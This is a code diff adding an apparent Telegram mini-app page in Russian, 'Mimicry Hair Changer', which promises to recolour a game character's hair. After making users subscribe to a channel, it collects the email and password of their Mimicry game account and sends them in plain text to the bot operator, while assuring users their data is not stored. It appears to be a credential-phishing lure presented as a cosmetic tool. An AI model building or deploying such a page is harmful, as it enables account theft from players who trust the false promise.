@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mimicry Hair Changer</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            box-shadow: 0 8px 32px rgba(255, 107, 107, 0.3);
+        }
+
+        .title {
+            color: white;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding: 0 20px;
+        }
+
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .step.active {
+            background: #4CAF50;
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 4px 20px rgba(76, 175, 80, 0.4);
+        }
+
+        .step.completed {
+            background: #2196F3;
+            color: white;
+        }
+
+        .step::after {
+            content: '';
+            position: absolute;
+            left: 35px;
+            top: 50%;
+            width: calc(100vw / 3 - 60px);
+            height: 2px;
+            background: rgba(255, 255, 255, 0.3);
+            z-index: -1;
+        }
+
+        .step:last-child::after {
+            display: none;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .form-input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            box-shadow: 0 8px 32px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 40px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-secondary {
+            background: #f8f9fa;
+            color: #667eea;
+            border: 2px solid #667eea;
+        }
+
+        .btn-secondary:hover {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .color-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .color-option {
+            aspect-ratio: 1;
+            border-radius: 16px;
+            border: 3px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 10px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: white;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+        }
+
+        .color-option:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        .color-option.selected {
+            border-color: #4CAF50;
+            transform: scale(1.1);
+            box-shadow: 0 0 0 4px rgba(76, 175, 80, 0.2);
+        }
+
+        .color-option .emoji {
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            text-align: center;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .status-success {
+            background: rgba(76, 175, 80, 0.1);
+            color: #2e7d32;
+            border: 1px solid rgba(76, 175, 80, 0.3);
+        }
+
+        .status-error {
+            background: rgba(244, 67, 54, 0.1);
+            color: #c62828;
+            border: 1px solid rgba(244, 67, 54, 0.3);
+        }
+
+        .status-info {
+            background: rgba(33, 150, 243, 0.1);
+            color: #1565c0;
+            border: 1px solid rgba(33, 150, 243, 0.3);
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .avatar-preview {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            background: linear-gradient(45deg, #ff9a56, #ffad56);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            box-shadow: 0 10px 40px rgba(255, 154, 86, 0.3);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInDown {
+            from { 
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">💇‍♂️</div>
+            <div class="title">Mimicry Hair Changer</div>
+            <div class="subtitle">Измените цвет волос персонажа</div>
+        </div>
+
+        <div class="step-indicator">
+            <div class="step active" id="step1">1</div>
+            <div class="step" id="step2">2</div>
+            <div class="step" id="step3">3</div>
+        </div>
+
+        <!-- Subscription Check -->
+        <div class="card" id="subscriptionCard">
+            <h3>Подписка на канал</h3>
+            <p>Для использования бота необходимо подписаться на наш канал</p>
+            <div style="margin: 20px 0;">
+                <button class="btn btn-primary" onclick="openChannel()">
+                    🔔 Подписаться
+                </button>
+            </div>
+            <button class="btn btn-secondary" onclick="checkSubscription()">
+                🔍 Проверить подписку
+            </button>
+        </div>
+
+        <!-- Login Form -->
+        <div class="card hidden" id="loginCard">
+            <h3>Вход в аккаунт</h3>
+            <div class="form-group">
+                <label class="form-label">Email от аккаунта Mimicry</label>
+                <input type="email" class="form-input" id="emailInput" placeholder="example@gmail.com">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Пароль</label>
+                <input type="password" class="form-input" id="passwordInput" placeholder="••••••••">
+            </div>
+            <button class="btn btn-primary" onclick="login()">
+                🔐 Войти
+            </button>
+            <div class="status-message status-info" style="margin-top: 15px;">
+                <small>Мы не сохраняем ваши данные</small>
+            </div>
+        </div>
+
+        <!-- Color Selection -->
+        <div class="card hidden" id="colorCard">
+            <h3>Выбор цвета волос</h3>
+            <div class="avatar-preview">👨‍🦱</div>
+            <div class="color-grid" id="colorGrid">
+                <!-- Colors will be populated by JavaScript -->
+            </div>
+            <button class="btn btn-primary" onclick="changeHairColor()" disabled id="changeColorBtn">
+                ✨ Изменить цвет
+            </button>
+        </div>
+
+        <!-- Success Card -->
+        <div class="card hidden" id="successCard">
+            <div style="text-align: center;">
+                <div style="font-size: 4rem; margin-bottom: 20px;">🎉</div>
+                <h3>Успешно!</h3>
+                <p>Цвет волос изменен. Перезайдите в игру для просмотра изменений.</p>
+                <div style="margin-top: 30px;">
+                    <button class="btn btn-primary" onclick="startOver()">
+                        🔄 Изменить снова
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="statusMessage"></div>
+    </div>
+
+    <script>
+        // Telegram WebApp initialization
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // Color mapping
+        const colorMap = {
+            'Розовый (Pink) 🌸': { bg: 'linear-gradient(45deg, #ff69b4, #ff1493)' },
+            'Оранжевый (Orange) 🍊': { bg: 'linear-gradient(45deg, #ff8c00, #ff4500)' },
+            'Синий (Blue) 🌊': { bg: 'linear-gradient(45deg, #0066ff, #0044cc)' },
+            'Зеленый (Green) 🍀': { bg: 'linear-gradient(45deg, #00ff00, #00cc00)' },
+            'Фиолетовый (Violet) 🟪': { bg: 'linear-gradient(45deg, #8a2be2, #6a1b9a)' },
+            'Красный (Red) ❤️': { bg: 'linear-gradient(45deg, #ff0000, #cc0000)' },
+            'Белый (White) 🌫️': { bg: 'linear-gradient(45deg, #ffffff, #f0f0f0)' },
+            'Голубой (Light Blue) 💙': { bg: 'linear-gradient(45deg, #00bfff, #0099cc)' },
+            'Желтый (Yellow) 💛': { bg: 'linear-gradient(45deg, #ffff00, #ffcc00)' },
+            'Персиковый (Peach) 🍑': { bg: 'linear-gradient(45deg, #ffcba4, #ff9999)' }
+        };
+
+        let selectedColor = null;
+
+        function showStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerHTML = `<div class="status-message status-${type}">${message}</div>`;
+            setTimeout(() => statusDiv.innerHTML = '', 5000);
+        }
+
+        function setStep(stepNumber) {
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.classList.remove('active', 'completed');
+                if (index + 1 < stepNumber) {
+                    step.classList.add('completed');
+                } else if (index + 1 === stepNumber) {
+                    step.classList.add('active');
+                }
+            });
+        }
+
+        function showCard(cardId) {
+            document.querySelectorAll('.card').forEach(card => card.classList.add('hidden'));
+            document.getElementById(cardId).classList.remove('hidden');
+        }
+
+        function openChannel() {
+            tg.openTelegramLink('https://t.me/gayguardian');
+        }
+
+        function checkSubscription() {
+            const checkBtn = document.querySelector('#subscriptionCard .btn-secondary');
+            const originalText = checkBtn.innerHTML;
+            
+            checkBtn.innerHTML = '<span class="loading"></span>Проверяем...';
+            checkBtn.disabled = true;
+            
+            showStatus('Проверяем подписку...', 'info');
+            
+            // Подготавливаем данные для отправки
+            const data = {
+                action: 'check_subscription',
+                user_id: tg.initDataUnsafe?.user?.id
+            };
+            
+            console.log('Sending subscription check data:', data);
+            
+            // Отправляем запрос на проверку подписки боту
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log('Data sent successfully via tg.sendData');
+            } catch (error) {
+                console.error('Error sending data:', error);
+                showStatus('Ошибка отправки данных', 'error');
+            }
+            
+            // Ждем ответ от бота (таймаут на случай если бот не отвечает)
+            setTimeout(() => {
+                checkBtn.innerHTML = originalText;
+                checkBtn.disabled = false;
+                showStatus('Время ожидания истекло. Попробуйте снова.', 'error');
+            }, 10000);
+        }
+
+        function login() {
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            if (!email || !password) {
+                showStatus('Заполните все поля', 'error');
+                return;
+            }
+
+            if (!isValidEmail(email)) {
+                showStatus('Некорректный формат email', 'error');
+                return;
+            }
+
+            const loginBtn = document.querySelector('#loginCard .btn-primary');
+            const originalText = loginBtn.innerHTML;
+            loginBtn.innerHTML = '<span class="loading"></span>Авторизация...';
+            loginBtn.disabled = true;
+
+            showStatus('Проверяем данные...', 'info');
+
+            // Подготавливаем данные для отправки
+            const data = {
+                action: 'auth_request',
+                email: email,
+                password: password,
+                user_id: tg.initDataUnsafe?.user?.id
+            };
+            
+            console.log('Sending auth data:', { ...data, password: '***' }); // Скрываем пароль в логах
+
+            // Отправляем данные авторизации боту
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log('Auth data sent successfully');
+            } catch (error) {
+                console.error('Error sending auth data:', error);
+                showStatus('Ошибка отправки данных', 'error');
+                loginBtn.innerHTML = originalText;
+                loginBtn.disabled = false;
+                return;
+            }
+
+            // Таймаут на случай если бот не отвечает
+            setTimeout(() => {
+                loginBtn.innerHTML = originalText;
+                loginBtn.disabled = false;
+                showStatus('Проверьте данные и попробуйте снова', 'error');
+            }, 15000);
+        }
+
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function initializeColorGrid() {
+            const colorGrid = document.getElementById('colorGrid');
+            colorGrid.innerHTML = '';
+
+            Object.entries(colorMap).forEach(([colorName, colorData]) => {
+                const colorDiv = document.createElement('div');
+                colorDiv.className = 'color-option';
+                colorDiv.style.background = colorData.bg;
+                
+                const parts = colorName.split(' ');
+                const emoji = parts[parts.length - 1];
+                const name = parts.slice(0, -1).join(' ');
+                
+                colorDiv.innerHTML = `
+                    <div class="emoji">${emoji}</div>
+                    <div>${name}</div>
+                `;
+                
+                colorDiv.addEventListener('click', () => selectColor(colorName, colorDiv));
+                colorGrid.appendChild(colorDiv);
+            });
+        }
+
+        function selectColor(colorName, element) {
+            document.querySelectorAll('.color-option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedColor = colorName;
+            document.getElementById('changeColorBtn').disabled = false;
+        }
+
+        function changeHairColor() {
+            if (!selectedColor) return;
+
+            const changeBtn = document.getElementById('changeColorBtn');
+            const originalText = changeBtn.innerHTML;
+            changeBtn.innerHTML = '<span class="loading"></span>Изменяем цвет...';
+            changeBtn.disabled = true;
+
+            showStatus('Применяем изменения...', 'info');
+
+            // Подготавливаем данные для отправки
+            const data = {
+                action: 'hair_color_changed',
+                color: selectedColor,
+                user_id: tg.initDataUnsafe?.user?.id
+            };
+            
+            console.log('Sending color change data:', data);
+
+            // Отправляем данные о смене цвета боту
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log('Color change data sent successfully');
+            } catch (error) {
+                console.error('Error sending color change data:', error);
+                showStatus('Ошибка отправки данных', 'error');
+                changeBtn.innerHTML = originalText;
+                changeBtn.disabled = false;
+                return;
+            }
+
+            // Таймаут на случай если бот не отвечает
+            setTimeout(() => {
+                changeBtn.innerHTML = originalText;
+                changeBtn.disabled = false;
+                showStatus('Ошибка при изменении цвета', 'error');
+            }, 15000);
+        }
+
+        function startOver() {
+            selectedColor = null;
+            setStep(1);
+            showCard('subscriptionCard');
+            document.getElementById('emailInput').value = '';
+            document.getElementById('passwordInput').value = '';
+        }
+
+        // Обработчики ответов от бота
+        function handleBotResponse(data) {
+            const action = data.action;
+            
+            switch(action) {
+                case 'subscription_checked':
+                    if (data.success) {
+                        setStep(2);
+                        showCard('loginCard');
+                        showStatus('Подписка подтверждена!', 'success');
+                    } else {
+                        showStatus('Вы не подписаны на канал!', 'error');
+                    }
+                    break;
+                    
+                case 'auth_response':
+                    if (data.success) {
+                        setStep(3);
+                        showCard('colorCard');
+                        initializeColorGrid();
+                        showStatus('Авторизация успешна!', 'success');
+                    } else {
+                        showStatus('Ошибка авторизации. Проверьте данные.', 'error');
+                    }
+                    break;
+                    
+                case 'color_changed':
+                    if (data.success) {
+                        showCard('successCard');
+                        showStatus(`Цвет волос изменен на ${selectedColor}`, 'success');
+                    } else {
+                        showStatus('Ошибка при изменении цвета', 'error');
+                    }
+                    break;
+            }
+        }
+
+        // Слушаем сообщения от Telegram
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'bot_response') {
+                handleBotResponse(event.data);
+            }
+        });
+        document.addEventListener('DOMContentLoaded', () => {
+            setStep(1);
+            showCard('subscriptionCard');
+            
+            // Apply Telegram theme
+            if (tg.colorScheme === 'dark') {
+                document.body.style.background = 'linear-gradient(135deg, #2c3e50 0%, #34495e 100%)';
+            }
+        });
+    </script>
+</body>
+</html>
